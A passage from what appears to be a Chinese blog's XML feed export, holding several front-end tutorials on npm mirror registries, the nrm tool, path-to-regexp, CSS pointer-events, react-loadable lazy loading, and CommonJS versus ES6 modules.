    <content><![CDATA[<h2 id="强制清除npm指令"><a href="#强制清除npm指令" class="headerlink" title="强制清除npm指令"></a>强制清除npm指令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm cache clean -f</span><br></pre></td></tr></table></figure>

<h2 id="设置下载源"><a href="#设置下载源" class="headerlink" title="设置下载源"></a>设置下载源</h2><blockquote>
<p>镜像使用方法（三种办法任意一种都能解决问题，建议使用第三种，将配&gt;置写死，下次用的时候配置还在）:</p>
<h4 id="1-通过config命令"><a href="#1-通过config命令" class="headerlink" title="1. 通过config命令"></a>1. 通过config命令</h4><p>npm config set registry [<a href="https://registry.npm.taobao.org]&gt;(https://registry.npm.taobao.org/)">https://registry.npm.taobao.org]&gt;(https://registry.npm.taobao.org/)</a> npm info underscore （如果上面配置正确&gt;这个命令会有字符串response）</p>
<h4 id="2-命令行指定"><a href="#2-命令行指定" class="headerlink" title="2. 命令行指定"></a>2. 命令行指定</h4><p>npm –registry <a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a> info underscore</p>
<h4 id="3-编辑-npmrc-加入下面内容"><a href="#3-编辑-npmrc-加入下面内容" class="headerlink" title="3. 编辑 ~/.npmrc 加入下面内容"></a>3. 编辑 ~/.npmrc 加入下面内容</h4><p>registry = <a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>nrm-——-快速切换NPM源</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/nrm-%E2%80%94%E2%80%94-%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2-NPM-%E6%BA%90/</url>
    <content><![CDATA[<p>不同地区访问不同的镜像速度可能有差异，然后各个镜像各自都可能有少数包暂时没有同步，因此，有时候需要切换 NPM 镜像。相比每次切换时都手动指定相应参数，使用***nrm ***要方便的多。<br>npm registry 管理工具 <a href="https://github.com/Pana/nrm">nrm</a>, 能够查看和切换当前使用的registry.</p>
<p>###Install</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install -g nrm</span><br></pre></td></tr></table></figure>
<p>###列出可选的源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nrm ls</span><br><span class="line"></span><br><span class="line">* npm ---- https:&#x2F;&#x2F;registry.npmjs.org&#x2F;</span><br><span class="line">  cnpm --- http:&#x2F;&#x2F;r.cnpmjs.org&#x2F;</span><br><span class="line">  eu ----- http:&#x2F;&#x2F;registry.npmjs.eu&#x2F;</span><br><span class="line">  au ----- http:&#x2F;&#x2F;registry.npmjs.org.au&#x2F;</span><br><span class="line">  sl ----- http:&#x2F;&#x2F;npm.strongloop.com&#x2F;</span><br><span class="line">  nj ----- https:&#x2F;&#x2F;registry.nodejitsu.com&#x2F;</span><br></pre></td></tr></table></figure>
<p>带 <code>*</code>的是当前使用的源，上面的输出表明当前源是官方源。</p>
<p>###切换<br>切换到cnpm</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nrm use cnpm &#x2F;&#x2F;switch registry to cnpm</span><br><span class="line"></span><br><span class="line">    Registry has been set to: http:&#x2F;&#x2F;r.cnpmjs.org&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="增加源"><a href="#增加源" class="headerlink" title="增加源"></a>增加源</h3><p>你可以增加定制的源，特别适用于添加企业内部的私有源。<a href="http://segmentfault.com/a/1190000000368906">私有源可以使用cnpmjs架设</a>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nrm add  &lt;registry&gt; &lt;url&gt; [home]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="删除源"><a href="#删除源" class="headerlink" title="删除源"></a>删除源</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nrm del &lt;registry&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="测试速度"><a href="#测试速度" class="headerlink" title="测试速度"></a>测试速度</h3><p>你还可以通过 <code>nrm test</code> 测试相应源的响应时间。</p>
<p>例如，测试官方源的响应时间：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; nrm test npm                                                                                                                               </span><br><span class="line"></span><br><span class="line">  npm ---- 1328ms</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>测试所有源的响应时间：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; nrm test                                                                                                                                   </span><br><span class="line"></span><br><span class="line">  npm ---- 891ms</span><br><span class="line">  cnpm --- 1213ms</span><br><span class="line">  eu ----- 3859ms</span><br><span class="line">  au ----- 1073ms</span><br><span class="line">  sl ----- 4150ms</span><br><span class="line">  nj ----- 8008ms</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意，为了取得较准确的结果，可以考虑多次测试取平均值。</p>
<h2 id="项目主页"><a href="#项目主页" class="headerlink" title="项目主页"></a>项目主页</h2><p><a href="https://github.com/Pana/nrm">github.com/Pana/nrm</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>nrm管理工具切换 NPM 镜像源</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/nrm%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E5%88%87%E6%8D%A2-NPM-%E9%95%9C%E5%83%8F%E6%BA%90/</url>
    <content><![CDATA[<p>由于 <code>npm原始源</code>会请求国外服务器，对于国内的开发者着实不友好，使用 <code>nrm</code>(全称：NPM registry manager) 可以快速地在不同 <code>npm镜像源</code>之间进行快速切换。<br><strong>github 地址:</strong><a href="https://github.com/Pana/nrm">nrm – NPM registry manager</a></p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>[图片上传中…(image.png-72bb4a-1590129698542-0)]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; npm install -g nrm</span><br></pre></td></tr></table></figure>

<blockquote>
<p>npm install packageName -g<br>// 安装 npm 包的指令，-g 是 global 的缩写，意为全局安装</p>
</blockquote>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>执行 <code>nrm ls</code> 命令可查看所有可切换的 <code>npm镜像源</code> , 带 <code>*</code> 为当前正在使用的 <code>npm镜像源</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;nrm ls</span><br><span class="line">  npm ---- https:&#x2F;&#x2F;registry.npmjs.org&#x2F;</span><br><span class="line">  cnpm --- http:&#x2F;&#x2F;r.cnpmjs.org&#x2F;</span><br><span class="line">* taobao - https:&#x2F;&#x2F;registry.npm.taobao.org&#x2F;</span><br><span class="line">  nj ----- https:&#x2F;&#x2F;registry.nodejitsu.com&#x2F;</span><br><span class="line">  rednpm - http:&#x2F;&#x2F;registry.mirror.cqupt.edu.cn&#x2F;</span><br><span class="line">  npmMirror  https:&#x2F;&#x2F;skimdb.npmjs.com&#x2F;registry&#x2F;</span><br><span class="line">  edunpm - http:&#x2F;&#x2F;registry.enpmjs.org&#x2F;</span><br></pre></td></tr></table></figure>

<p>执行 <code>nrm use npmImageName</code> 即可切换到列表中存在的 <code>npm镜像源</code>，使用淘宝镜像为例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;nrm use taobao</span><br><span class="line">Registry has been set to: https:&#x2F;&#x2F;registry.npm.taobao.org&#x2F;</span><br></pre></td></tr></table></figure>

<p>此后再调用 <code>npm install</code> 下载任意包都会使用新的 <code>npm镜像源</code>进行下载。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>url 的正则表达式：path-to-regexp</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/path-to-regexp/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>该工具库用来处理 url 中地址与参数，能够很方便得到我们想要的数据。</p>
<p>js 中有 RegExp 方法做正则表达式校验，而 path-to-regexp 可以看成是 url 字符串的正则表达式。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>第三方库，使用前先进行安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install path-to-regexp</span><br></pre></td></tr></table></figure>
<p>在 js 中使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const pathToRegexp &#x3D; require(&#39;path-to-regexp&#39;);</span><br></pre></td></tr></table></figure>
<h2 id="API-介绍"><a href="#API-介绍" class="headerlink" title="API 介绍"></a>API 介绍</h2><h5 id="1-pathToRegexp"><a href="#1-pathToRegexp" class="headerlink" title="1. pathToRegexp()"></a>1. pathToRegexp()</h5><p>作用：这里这个方法可以类比于 js 中 new ExpReg(‘xxx’)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var pathToRegexp &#x3D; require(&#39;path-to-regexp&#39;)</span><br><span class="line"></span><br><span class="line">var re &#x3D; pathToRegexp(&#39;&#x2F;foo&#x2F;:bar&#39;)</span><br><span class="line">console.log(re);	</span><br></pre></td></tr></table></figure>
<p>打印结果如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;^\&#x2F;foo\&#x2F;((?:[^\&#x2F;]+?))(?:\&#x2F;(?&#x3D;$))?$&#x2F;i</span><br></pre></td></tr></table></figure>
<p>要注意两点，一点是我们自己的 url 地址，一条是匹配规则。</p>
<h5 id="2-exec"><a href="#2-exec" class="headerlink" title="2. exec()"></a>2. exec()</h5><p>作用：匹配 url 地址与规则是否相符。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var pathToRegexp &#x3D; require(&#39;path-to-regexp&#39;)</span><br><span class="line"></span><br><span class="line">var re &#x3D; pathToRegexp(&#39;&#x2F;foo&#x2F;:bar&#39;);     &#x2F;&#x2F; 匹配规则</span><br><span class="line">var match1 &#x3D; re.exec(&#39;&#x2F;test&#x2F;route&#39;);    &#x2F;&#x2F; url 路径</span><br><span class="line">var match2 &#x3D; re.exec(&#39;&#x2F;foo&#x2F;route&#39;);     &#x2F;&#x2F; url 路径</span><br><span class="line"></span><br><span class="line">console.log(match1);</span><br><span class="line">console.log(match2);</span><br></pre></td></tr></table></figure>
<p>打印结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">null</span><br><span class="line">[ &#39;&#x2F;foo&#x2F;route&#39;, &#39;route&#39;, index: 0, input: &#39;&#x2F;foo&#x2F;route&#39; ]</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<p>上述代码中，第一个 url 路径与匹配规则不相符返回 null，第二个 url 路径与匹配规则相符，返回一个数组。</p>
<h5 id="3-parse"><a href="#3-parse" class="headerlink" title="3. parse()"></a>3. parse()</h5><p>作用：解析 url 字符串中的参数部分（:id）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var pathToRegexp &#x3D; require(&#39;path-to-regexp&#39;);</span><br><span class="line"></span><br><span class="line">var url &#x3D; &#39;&#x2F;user&#x2F;:id&#39;;</span><br><span class="line">console.log(pathToRegexp.parse(url));</span><br></pre></td></tr></table></figure>
<p>打印结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ &#39;&#x2F;user&#39;,</span><br><span class="line">  &#123; name: &#39;id&#39;,</span><br><span class="line">    prefix: &#39;&#x2F;&#39;,</span><br><span class="line">    delimiter: &#39;&#x2F;&#39;,</span><br><span class="line">    optional: false,</span><br><span class="line">    repeat: false,</span><br><span class="line">    partial: false,</span><br><span class="line">    pattern: &#39;[^\\&#x2F;]+?&#39; &#125; ]</span><br></pre></td></tr></table></figure>
<p>说明：返回一个数组，从第二个数据可以就可以得到 url 地址携带参数的属性名称（item.name）。</p>
<p>当然，url 中携带参数出了 :id 这种形式，还有 /user?id=11 这种，使用 parse() 方法解析自行查看结果。</p>
<h5 id="4-compile"><a href="#4-compile" class="headerlink" title="4. compile()"></a>4. compile()</h5><p>作用：快速填充 url 字符串的参数值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var pathToRegexp &#x3D; require(&#39;path-to-regexp&#39;)</span><br><span class="line"></span><br><span class="line">var url &#x3D; &#39;&#x2F;user&#x2F;:id&#x2F;:name&#39;</span><br><span class="line">var data &#x3D; &#123;id: 10001, name: &#39;bob&#39;&#125;</span><br><span class="line">console.log(pathToRegexp.compile(url)(data))</span><br></pre></td></tr></table></figure>
<p>打印结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;user&#x2F;10001&#x2F;bob</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>pointer-events</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/pointer-events/</url>
    <content><![CDATA[<p>pointer-events<br>语法：<br>pointer-events：auto| none | visiblepainted | visiblefill | visiblestroke | visible | painted | fill | stroke | all<br>默认值：auto<br>适用于：所有元素<br>继承性：有<br>动画性：否<br>计算值：指定值</p>
<ul>
<li>取值：<br>auto：<br>与pointer-events属性未指定时的表现效果相同。在svg内容上与visiblepainted值相同<br>none：<br>元素永远不会成为鼠标事件的target。但是，当其后代元素的pointer-events属性指定其他值时，鼠标事件可以指向后代元素，在这种情况下，鼠标事件将在捕获或冒泡阶触发父元素的事件侦听器。<br>其他值只能应用在SVG上。</li>
</ul>
<p>说明：<br>设置或检索在何时成为属性事件的target。<br>使用pointer-events来阻止元素成为鼠标事件目标不一定意味着元素上的事件侦听器永不会触发。如果元素后代明确指定了pointer-events属性并允许其成为鼠标事件的目标，那么指向该元素的任何事件在事件传播过程中都将通过父元素，并以适当的方式触发其上的事件侦听器。当然位于屏幕上在父元素上但不在后代元素上的鼠标活动都不会被父元素和后代元素捕获（将会穿过父元素而指向位于其下面的元素）。<br>对应的脚本特性为pointerEvents。<br>兼容性：<br>浅绿 = 支持</p>
<p>红色 = 不支持</p>
<p>粉色 = 部分支持<br><img src="https://upload-images.jianshu.io/upload_images/10024246-2b69550f256cac89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-cmn-Hans&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">a[href&#x3D;&quot;http:&#x2F;&#x2F;example.com&quot;] &#123;</span><br><span class="line">	pointer-events: none;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">	&lt;li&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;html.cn&#x2F;&quot;&gt;HTML中文网&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">	&lt;li&gt;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;example.com&quot;&gt;一个不能点击的链接&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>react-loadable懒加载</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/react-loadable%E6%87%92%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><strong>react-loadable</strong><br>官网最精简的描述：</p>
<blockquote>
<p>A higher order component for loading components with dynamic imports.<br>用于加载带有动态导入的组件的高阶组件。</p>
</blockquote>
<p>React Loadable是一个小型库，它使以组件为中心的代码分割变得非常容易。</p>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>当你的React应用，你把它和Webpack捆绑在一起，一切都很顺利。但有一天你会注意到你的应用程序包变得如此之大以至于它会减慢速度。<br>是时候开始分解你的应用程序代码了!</p>
<p>例如以下情景：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Root extends React.Component &#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">        return (</span><br><span class="line">            &lt;Router&gt;</span><br><span class="line">                &lt;div&gt;</span><br><span class="line">                    &lt;Route exact path&#x3D;&quot;&#x2F;&quot; component&#x3D;&#123;PCIndex&#125;&gt;&lt;&#x2F;Route&gt;</span><br><span class="line">                    &lt;Route path&#x3D;&quot;&#x2F;details&#x2F;:id&quot; component&#x3D;&#123;PCDetails&#125;&gt;&lt;&#x2F;Route&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;Router&gt;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">    &lt;Root &#x2F;&gt;,</span><br><span class="line">    document.getElementById(&#39;app&#39;));</span><br></pre></td></tr></table></figure>

<p><strong>这种写法缺点：</strong><br>在首页直接加载了组件，如果很多的时候，那么你的应用首屏展现的时候就会变得非常慢了。</p>
<p><strong>react-loadable的作用</strong><br>由于路由只是组件，我们仍然可以在路由级别轻松地进行代码拆分。<br>在你的应用程序中引入新的代码分割点应该是如此简单，以至于你不会再三考虑。这应该是一个改变几行代码和其他一切都应该自动化的问题。<br>Loadable是一个高阶组件(一个创建组件的函数)，它允许您在将任何模块呈现到应用程序之前动态加载它。</p>
<h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p><strong>import()</strong><br>当您在Webpack 2+中使用import()时，它将自动为您分割代码，而不需要额外的配置。<br>这意味着只需切换到import()并使用React Loadable，就可以轻松地试验新的代码分割点。找出最适合你的应用程序的。</p>
<p><strong>Loading…</strong><br>呈现静态“Loading…”不能与用户进行足够的通信。您还需要考虑错误状态、超时，并使之成为一种良好的体验。</p>
<p><strong>Loadable</strong><br>用于在呈现模块之前动态加载模块的高阶组件，在模块不可用时呈现加载组件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const LoadableComponent &#x3D; Loadable(&#123;</span><br><span class="line">  loader: () &#x3D;&gt; import(&#39;.&#x2F;Bar&#39;),</span><br><span class="line">  loading: Loading,</span><br><span class="line">  delay: 200,</span><br><span class="line">  timeout: 10000,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>Loadable.Map</strong><br>允许并行加载多个资源的高阶组件。<br>可加载的。地图的选择。加载器接受函数对象，并需要一个选项。渲染方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Loadable.Map(&#123;</span><br><span class="line">  loader: &#123;</span><br><span class="line">    Bar: () &#x3D;&gt; import(&#39;.&#x2F;Bar&#39;),</span><br><span class="line">    i18n: () &#x3D;&gt; fetch(&#39;.&#x2F;i18n&#x2F;bar.json&#39;).then(res &#x3D;&gt; res.json()),</span><br><span class="line">  &#125;,</span><br><span class="line">  render(loaded, props) &#123;</span><br><span class="line">    let Bar &#x3D; loaded.Bar.default;</span><br><span class="line">    let i18n &#x3D; loaded.i18n;</span><br><span class="line">    return &lt;Bar &#123;...props&#125; i18n&#x3D;&#123;i18n&#125;&#x2F;&gt;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4><p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i react-loadable</span><br></pre></td></tr></table></figure>

<p><strong>懒加载配置/router/index.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import React from &#39;react&#39;</span><br><span class="line">import Loadable from &quot;react-loadable&quot;</span><br><span class="line"></span><br><span class="line">let config &#x3D; [</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#39;&#x2F;&#39;,</span><br><span class="line">        path: &#39;&#x2F;&#39;,</span><br><span class="line">        exact: true,</span><br><span class="line">        component: Loadable(&#123;</span><br><span class="line">            loader: () &#x3D;&gt; import(&#39;..&#x2F;components&#x2F;pc&#x2F;pc_blog_content&#39;),</span><br><span class="line">            loading: () &#x3D;&gt; &lt;div &#x2F;&gt;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#39;home&#39;,</span><br><span class="line">        path: &#39;&#x2F;home&#39;,</span><br><span class="line">        exact: true,</span><br><span class="line">        component: Loadable(&#123;</span><br><span class="line">            loader: () &#x3D;&gt; import(&#39;..&#x2F;components&#x2F;&#x2F;pc&#x2F;pc_blog_content&#39;),</span><br><span class="line">            loading: () &#x3D;&gt; &lt;div &#x2F;&gt;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#39;detail&#39;,</span><br><span class="line">        path: &#39;&#x2F;detail&#x2F;:id&#39;,</span><br><span class="line">        exact: false,</span><br><span class="line">        component: Loadable(&#123;</span><br><span class="line">            loader: () &#x3D;&gt; import(&#39;..&#x2F;components&#x2F;pc&#x2F;pc_article_detail&#39;),</span><br><span class="line">            loading: () &#x3D;&gt; &lt;div &#x2F;&gt;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#39;timeline&#39;,</span><br><span class="line">        path: &#39;&#x2F;timeline&#39;,</span><br><span class="line">        exact: true,</span><br><span class="line">        component: Loadable(&#123;</span><br><span class="line">            loader: () &#x3D;&gt; import(&#39;..&#x2F;components&#x2F;pc&#x2F;pc_timeline_index&#39;),</span><br><span class="line">            loading: () &#x3D;&gt; &lt;div &#x2F;&gt;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#39;album&#39;,</span><br><span class="line">        path: &#39;&#x2F;album&#39;,</span><br><span class="line">        exact: true,</span><br><span class="line">        component: Loadable(&#123;</span><br><span class="line">            loader: () &#x3D;&gt; import(&#39;..&#x2F;components&#x2F;pc&#x2F;pc_album_index&#39;),</span><br><span class="line">            loading: () &#x3D;&gt; &lt;div &#x2F;&gt;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#39;message&#39;,</span><br><span class="line">        path: &#39;&#x2F;message&#39;,</span><br><span class="line">        exact: true,</span><br><span class="line">        component: Loadable(&#123;</span><br><span class="line">            loader: () &#x3D;&gt; import(&#39;..&#x2F;components&#x2F;pc&#x2F;pc_message_index&#39;),</span><br><span class="line">            loading: () &#x3D;&gt; &lt;div &#x2F;&gt;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#39;about&#39;,</span><br><span class="line">        path: &#39;&#x2F;about&#39;,</span><br><span class="line">        exact: true,</span><br><span class="line">        component: Loadable(&#123;</span><br><span class="line">            loader: () &#x3D;&gt; import(&#39;..&#x2F;components&#x2F;pc&#x2F;pc_aboutme_index&#39;),</span><br><span class="line">            loading: () &#x3D;&gt; &lt;div &#x2F;&gt;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#39;albumlList&#39;,</span><br><span class="line">        path: &#39;&#x2F;albumList&#x2F;:id&#39;,</span><br><span class="line">        exact: false,</span><br><span class="line">        component: Loadable(&#123;</span><br><span class="line">            loader: () &#x3D;&gt; import(&#39;..&#x2F;components&#x2F;pc&#x2F;pc_album_list&#39;),</span><br><span class="line">            loading: () &#x3D;&gt; &lt;div &#x2F;&gt;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">export default config</span><br></pre></td></tr></table></figure>

<p>结合react-router4<br>官网参考<br><a href="https://reacttraining.com/react-router/web/guides/code-splitting">https://reacttraining.com/rea…</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import React from &#39;react&#39;;</span><br><span class="line">import ReactDOM from &#39;react-dom&#39;;</span><br><span class="line">import PCBlogIndex from &#39;.&#x2F;components&#x2F;pc&#x2F;pc_blog_index&#39;</span><br><span class="line">&#x2F;&#x2F;这句就是引入react-loadable</span><br><span class="line">import routers from &#39;.&#x2F;router&#x2F;index&#39;;</span><br><span class="line">import &#123; BrowserRouter as Router, Route, Switch &#125; from &quot;react-router-dom&quot;;</span><br><span class="line">import &#123; Provider &#125; from &#39;react-redux&#39;</span><br><span class="line">import configureStore from &#39;.&#x2F;store&#x2F;configureStore&#39;</span><br><span class="line">const store &#x3D; configureStore();</span><br><span class="line"></span><br><span class="line">class Root extends React.Component &#123;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        return (</span><br><span class="line">            &lt;Provider store&#x3D;&#123;store&#125;&gt;</span><br><span class="line">            &lt;Router&gt;</span><br><span class="line">                &lt;Switch&gt;</span><br><span class="line">                    &lt;PCBlogIndex&gt;</span><br><span class="line">                             &#123;&#x2F;* 导入相关路由配置 *&#x2F;&#125;</span><br><span class="line">                        &#123;routers.map((r, key) &#x3D;&gt; &lt;Route component&#x3D;&#123;r.component&#125; exact&#x3D;&#123;!!r.exact&#125; key&#x3D;&#123;key&#125; path&#x3D;&#123;r.path&#125; &#x2F;&gt;)&#125;</span><br><span class="line">                    &lt;&#x2F;PCBlogIndex&gt;</span><br><span class="line">                &lt;&#x2F;Switch&gt;</span><br><span class="line">            &lt;&#x2F;Router&gt;</span><br><span class="line">            &lt;&#x2F;Provider&gt;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">    &lt;Root &#x2F;&gt;,</span><br><span class="line">    document.getElementById(&#39;app&#39;));</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>关于react-loadable服务器渲染等更加高级操作可以参考官网<br><a href="https://github.com/jamiebuilds/react-loadable">https://github.com/jamiebuild…</a><br>至于普通的操作按上面两步操作，结合官网的相关配置API，估计你能够实现懒加载的功能了。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>require和import</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/require%E5%92%8Cimport/</url>
    <content><![CDATA[<hr>
<p>ES6标准发布后，module成为标准，标准的使用是以export指令导出接口，以import引入模块，但是在我们一贯的node模块中，我们采用的是CommonJS规范，使用require引入模块，使用module.exports导出接口。</p>
<p>#####<a href="http://wiki.commonjs.org/wiki/Modules/1.1">CommonJS</a><br>CommonJS定义的模块分为:{模块引用(require)} {模块定义(exports)} {模块标识(module)}<br>require()用来引入外部模块；exports对象用于导出当前模块的方法或变量，唯一的导出口；module对象就代表模块本身。<br>require统治了ES6之前的所有模块化编程，即使现在，在ES6 module被完全实现之前，还是这样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; a.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; -------- node -----------</span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  a : function() &#123;&#125;,</span><br><span class="line">  b : &#39;xxx&#39;</span><br><span class="line">&#125;;</span><br><span class="line">&#x2F;&#x2F; b.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ------------ node ---------</span><br><span class="line">var m &#x3D; require(&#39;.&#x2F;a&#39;);</span><br><span class="line">m.a();</span><br></pre></td></tr></table></figure>
<p><strong>require()是同步方法</strong><br>ES6发布的module并没有直接采用CommonJS，甚至连require都没有采用，也就是说require仍然只是node的一个私有的全局方法，module.exports也只是node私有的一个全局变量属性</p>
<p><em><strong>注意：module.exports方法不会多次生效，只执行最后一行语句的导出方法，这个与下面要介绍的export是有区别的，后面会介绍这个</strong></em></p>
<p>###ES6 模块<br>ES6 模块不是对象，而是通过export命令显式指定输出的代码，再通过import命令输入。<br>模块功能主要由两个命令构成：export和import。export命令用于规定模块的对外接口，import命令用于输入其他模块提供的功能。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; ES6模块</span><br><span class="line">import &#123; stat, exists, readFile &#125; from &#39;fs&#39;;</span><br></pre></td></tr></table></figure>
<p>上面代码的实质是从fs模块加载 3 个方法，其他方法不加载。这种加载称为“编译时加载”或者静态加载，即 ES6 可以在编译时就完成模块加载，效率要比 CommonJS 模块的加载方式高。但是这样会造成import时无法动态加载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;react native根据平台动态加载js，无法使用import方式加载</span><br><span class="line">var NativeAPI &#x3D; require(&#39;.&#x2F;Native_API&#x2F;NativeAPI.&#39; + Platform.OS);</span><br></pre></td></tr></table></figure>
<p>###<a href="https://developer.mozilla.org/en-US/docs/web/javascript/reference/statements/export">export</a>导出模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; module &quot;my-module.js&quot;</span><br><span class="line">function cube(x) &#123;</span><br><span class="line">  return x * x * x;</span><br><span class="line">&#125;</span><br><span class="line">const foo &#x3D; Math.PI + Math.SQRT2;</span><br><span class="line">export &#123; cube, foo &#125;;</span><br></pre></td></tr></table></figure>
